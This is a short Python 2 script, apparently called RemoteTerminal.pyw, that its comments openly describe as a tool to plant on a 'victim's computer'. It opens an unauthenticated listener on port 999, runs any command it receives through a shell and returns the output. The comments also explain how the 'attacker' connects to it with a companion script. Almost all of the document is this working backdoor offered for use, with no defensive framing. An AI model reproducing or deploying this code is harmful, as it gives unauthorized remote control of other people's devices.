# -*- encoding: utf-8 -*-
# !/usr/bin/python
# Created by NanoCoder
# Works on all device with python!
# You have to start on the victim's computer or other device RemoteTerminal.pyw
# You can find Connect_To.py here: https://github.com/kaasmanxd/Packet-Squirrel-payload/blob/master/Connect_To.py
# If you have done that, you have to start on the attacker his computer Terminal or Command Prompt and then type this: 
# Python Connect_To.py [Victem's ip] [Victem's port]
# When you have done that, you are ready and you can type your commands.

from sys import platform as _platform
import subprocess, platform, socket, select, os
from thread import *
 
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

HOST = ''
PORT = 999
 
server.bind((HOST, PORT))
server.listen(100)
list_of_clients = []
 
def clientthread(conn, addr):
 
    conn.send("                  Welcome to Remote " + platform.system() + " Terminal Service")
    conn.send(b'\nYou are connected !\n')
	
    while True:
            try:
                message = conn.recv(1048)
                if message:                    
                    proc = subprocess.Popen(str(message), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read()
                    conn.send(b'\n' + stdoutput)					
                else:
                    remove(conn)
 
            except:
                continue
 
def remove(connection):
    if connection in list_of_clients:
        list_of_clients.remove(connection)
 
while True:
 
    conn, addr = server.accept()
    list_of_clients.append(conn)
    print "Got connection from", addr
    start_new_thread(clientthread,(conn,addr))    
 
conn.close()
server.close()
